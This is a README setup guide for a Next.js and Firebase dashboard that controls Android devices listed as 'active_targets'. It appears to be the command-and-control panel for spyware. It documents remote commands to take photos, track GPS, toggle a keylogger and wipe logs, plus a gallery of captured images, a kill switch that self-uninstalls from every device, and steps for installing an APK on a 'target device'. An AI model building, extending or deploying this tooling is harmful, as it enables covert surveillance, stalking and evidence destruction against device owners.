# 🔥 Kei Dashboard v3.0 - Professional Setup Guide

**A professional-grade real-time monitoring command center with military-grade security UI**

---

## ⚡ Quick Start

### 1. Install Dependencies

```bash
npm install --legacy-peer-deps --no-audit
```

The `--legacy-peer-deps` flag is required due to React 19 compatibility with react-leaflet.

### 2. Environment Setup

Create `.env.local` with your Firebase credentials:

```env
NEXT_PUBLIC_FIREBASE_API_KEY=your_api_key
NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN=your_project.firebaseapp.com
NEXT_PUBLIC_FIREBASE_PROJECT_ID=your_project_id
NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET=your_project.appspot.com
NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID=your_sender_id
NEXT_PUBLIC_FIREBASE_APP_ID=your_app_id
```

### 3. Firebase Security Rules

Deploy the security rules from `firebase.rules.json` to your Firebase project:

```bash
firebase deploy --only database:rules
```

**Important:** The rules restrict database access to the Admin UID only. Set your admin UID in Firebase Realtime Database:

```json
{
  "admin_uid": "YOUR_USER_UID"
}
```

### 4. Run Development Server

```bash
npm run dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

---

## 📋 Database Structure

The Firebase Realtime Database must follow this structure:

```
{
  "admin_uid": "YOUR_UID", // Store your authentication UID here
  "kei-vault": {
    "active_targets": {
      "$deviceId": {
        "id": "device_id",
        "model": "Device Model Name",
        "android_version": "14.0",
        "battery": 85,
        "ip_address": "192.168.1.100",
        "status": "online",
        "last_ping": 1234567890
      }
    },
    "commands": {
      "$deviceId": {
        "$commandId": {
          "action": "take_photo", // take_photo | get_gps | wipe_logs | toggle_keylog | self_uninstall
          "timestamp": 1234567890,
          "status": "pending" // pending | executed | failed
        }
      }
    },
    "device_locations": {
      "$deviceId": {
        "lat": 40.7128,
        "lng": -74.0060,
        "timestamp": 1234567890,
        "accuracy": 5
      }
    },
    "activity_logs": {
      "$logId": {
        "message": "Device connected",
        "timestamp": 1234567890,
        "device_id": "device_id",
        "type": "info" // info | warning | error | success
      }
    },
    "system_logs": {
      "$logId": {
        "message": "System event",
        "timestamp": 1234567890,
        "type": "info",
        "device_id": "device_id" // optional
      }
    }
  }
}
```

---

## 🏗️ File Structure

```
src/
├── app/
│   ├── dashboard/
│   │   ├── page.tsx                 # Main dashboard
│   │   ├── command-center/page.tsx  # Command interface
│   │   ├── map/page.tsx             # GPS tracking
│   │   ├── terminal/page.tsx        # Activity logs
│   │   └── logs/page.tsx            # System logs
│   ├── auth/login/page.tsx          # Login interface
│   ├── layout.tsx                   # Root layout with providers
│   └── globals.css                  # Global styles (matrix theme)
│
├── components/
│   ├── dashboard/
│   │   ├── StatCard.tsx             # Dashboard statistics
│   │   ├── DeviceGrid.tsx           # Device cards grid
│   │   ├── CommandCenter.tsx        # Command sender
│   │   ├── ActivityTerminal.tsx     # Terminal logs
│   │   ├── ImageGallery.tsx         # Image captures masonry
│   │   ├── KillSwitch.tsx           # Emergency wipe feature
│   │   └── Sidebar.tsx              # Navigation sidebar
│   └── ui/
│       ├── Button.tsx
│       ├── Card.tsx
│       └── Progress.tsx
│
├── hooks/
│   └── useFirebase.ts               # All Firebase hooks with TanStack Query
│
├── lib/
│   ├── firebase.ts                  # Firebase config
│   ├── cn.ts                        # Classname utils
│   └── constants.ts                 # App constants
│
├── providers/
│   └── FirebaseProvider.tsx         # Firebase context & Query client
│
└── types/
    └── index.ts                     # TypeScript definitions
```

---

## 🎨 Design System

### Theme Colors
- **Background**: `#020617` / `#0a0b10` (Dark)
- **Accent**: `#00ff41` (Neon Green)
- **Secondary**: `#161b22` (Dark Gray)

### Font
- **Primary**: JetBrains Mono / Roboto Mono (monospace)
- **Effect**: Matrix/Hacker aesthetic with glow effects

### Key Components

#### StatCard
Real-time statistics with pulse animation for active metrics
```tsx
<StatCard
  title="Active Sessions"
  value={15}
  icon={<Activity size={20} />}
  isPulse={true}
  trend={8}
  trendLabel="connections"
/>
```

#### ImageGallery
Masonry grid of device captures with preview modal
```tsx
<ImageGallery 
  images={capturedImages}
  isLoading={false}
  deviceId="device123"
/>
```

#### KillSwitch
Emergency self-uninstall command center
```tsx
<KillSwitch
  devices={allDevices}
  onSuccess={() => console.log('Kill switch executed')}
/>
```

---

## 🚀 Features

### ✅ Implemented
- **Real-time Synchronization**: Firebase onValue listeners for instant updates
- **Command Center**: Send commands (take_photo, get_gps, wipe_logs, toggle_keylog, self_uninstall)
- **GPS Tracking**: Real-time device locations with breadcrumb history
- **Image Gallery**: WebP capture masonry grid from Firebase Storage
- **Activity Terminal**: Matrix-style scrolling log display
- **System Logs**: Advanced table with search & filtering
- **Kill Switch**: Emergency self-uninstall to ALL devices
- **TanStack Query**: Data caching & synchronization
- **Skeleton Screens**: Loading states for better UX
- **Mobile Responsive**: Adaptive sidebar for mobile devices
- **Matrix Theme**: Neon green on dark with monospace fonts

### 🔒 Security Features
- **Firebase Security Rules**: Restrict access to Admin UID only
- **Validation**: Strict data validation on server-side
- **Command Validation**: Only accepted actions can be executed
- **Audit Logging**: All commands logged with timestamps

---

## 🔄 Real-time Data Flow

```
Firebase DB → Real-time Listener (onValue)
    ↓
React State Update (via useEffect)
    ↓
TanStack Query Cache Invalidation
    ↓
Component Re-render with new data
    ↓
Smooth Framer Motion Animation
```

---

## 📱 Deployment

### Option 1: Vercel (Recommended)
```bash
npm run build
vercel deploy
```

### Option 2: Firebase Hosting
```bash
firebase login
firebase init hosting
npm run build
firebase deploy --only hosting
```

### Option 3: Docker
```bash
docker build -t kei-dashboard .
docker run -p 3000:3000 kei-dashboard
```

---

## 🧪 Testing with APK

1. **Start Dashboard**: `npm run dev`
2. **Open in browser**: Chrome on your phone at `http://YOUR_IP:3000`
3. **Run APK**: Install Flying Bird APK on target device
4. **Monitor**: Real-time logs appear in Activity Terminal
5. **Send Commands**: Use Command Center to control device

---

## ⚙️ Configuration

### Tailwind CSS
- Located in `tailwind.config.ts`
- Custom theme extensions for matrix styling

### Next.js
- App Router (Latest)
- Server & Client Components mixed
- Dynamic imports for Leaflet (browser-only)

### Firebase
- Realtime Database (No Firestore)
- Cloud Storage for image captures
- Firebase Authentication
- Security Rules enforced

---

## 🐛 Troubleshooting

### Dependencies not installing
```bash
rm -rf node_modules package-lock.json
npm install --legacy-peer-deps --no-audit
```

### Firebase permission denied
- Check Admin UID is set in `/admin_uid` path
- Verify security rules are deployed
- Ensure user is authenticated

### Images not loading
- Check Firebase Storage bucket path: `kei-vault/captures/`
- Verify storage security rules allow reading
- Ensure images are `.webp` format

### Real-time updates not working
- Check database path: `/kei-vault/*`
- Verify Firebase SDK initialization
- Check browser console for errors

---

## 📚 API Reference

### Hooks

#### useActiveDevices()
```tsx
const { devices, isLoading, error } = useActiveDevices();
```

#### useSendCommand()
```tsx
const { mutate: sendCommand } = useSendCommand();
sendCommand({ deviceId: "123", action: "take_photo" });
```

#### useImageCaptures(deviceId?)
```tsx
const { images, isLoading } = useImageCaptures("device123");
```

#### useKillSwitch()
```tsx
const { mutate: executeKillSwitch } = useKillSwitch();
executeKillSwitch(["device1", "device2"]);
```

---

## 📝 License

Professional-grade dashboard for authorized use only.

---

**Last Updated**: April 2026  
**Version**: 3.0.0  
**Status**: Production Ready ✅
